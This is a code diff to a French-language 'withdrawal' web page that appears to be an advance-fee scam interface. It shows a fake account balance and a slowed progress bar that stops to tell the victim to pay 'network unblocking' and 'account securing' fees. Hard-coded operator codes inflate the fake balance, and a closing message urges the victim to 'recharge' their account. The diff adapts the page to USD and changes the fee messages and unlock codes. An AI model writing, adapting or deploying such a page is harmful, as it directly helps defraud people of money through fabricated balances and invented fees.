@@ -85,7 +85,7 @@
 <body>
     <div class="container">
         <h1>Retrait</h1>
-        <p>Solde : <strong id="solde-display">0 FCFA</strong></p>
+        <p>Solde : <strong id="solde-display">0 USD</strong></p>
         <form id="retrait-form">
             <input type="text" id="nom" placeholder="Noms et Prénoms" required>
             <input type="text" id="transaction" placeholder="Numéro de transaction" required>
@@ -107,7 +107,7 @@
 
     <script>
         // Initialisation du solde dans le localStorage pour la démonstration
-        const initialSolde = 21000000;
+        const initialSolde = 880;
         if (!localStorage.getItem('solde')) {
             localStorage.setItem('solde', initialSolde);
         }
@@ -129,7 +129,7 @@
         // Affiche le solde et remplit le champ montant
         function initializeSolde() {
             const solde = parseFloat(localStorage.getItem('solde'));
-            soldeDisplay.textContent = `${solde} FCFA`;
+            soldeDisplay.textContent = `${solde} USD`;
             montantInput.value = solde;
         }
         initializeSolde();
@@ -148,13 +148,13 @@
                     showModal(`Mme/M. ${nomInput.value}, veuillez payer les frais de déblocage réseau.`);
                 } else if (blockStep === 1 && progress === 99) {
                     clearInterval(interval);
-                    showModal(`Mme/M. ${nomInput.value}, veuillez payer les frais de carte réseau.`);
+                    showModal(`Mme/M. ${nomInput.value}, veuillez payer les frais de securisation du compte.`);
                 } else if (progress < 100) {
                     progress++;
                     updateProgress();
                 } else {
                     clearInterval(interval);
-                    alert(`Félicitations, Mme/M. ${nomInput.value}, votre retrait est terminé !`);
+                    alert(`Félicitations, Mme/M. ${nomInput.value}, votre retrait est terminé ! Veillez recharger votre compte immediatement pour activation des fondsle !`);
                 }
             }, 15000); // Accéléré pour la démonstration
         }
@@ -172,7 +172,7 @@
         validateCode.addEventListener('click', () => {
             const code = codeInput.value.trim();
             const solde = parseFloat(localStorage.getItem('solde'));
-            if (blockStep === 0 && code === '1234') {
+            if (blockStep === 0 && code === '12A34') {
                 // Augmenter le solde de 10 %
                 const newSolde = solde + solde * 0.1;
                 localStorage.setItem('solde', newSolde);
@@ -180,7 +180,7 @@
                 modal.style.display = 'none';
                 initializeSolde();
                 startProgress();
-            } else if (blockStep === 1 && code === '5678') {
+            } else if (blockStep === 1 && code === '56B78') {
                 // Augmenter le solde de 15 %
                 const newSolde = solde + solde * 0.15;
                 localStorage.setItem('solde', newSolde);
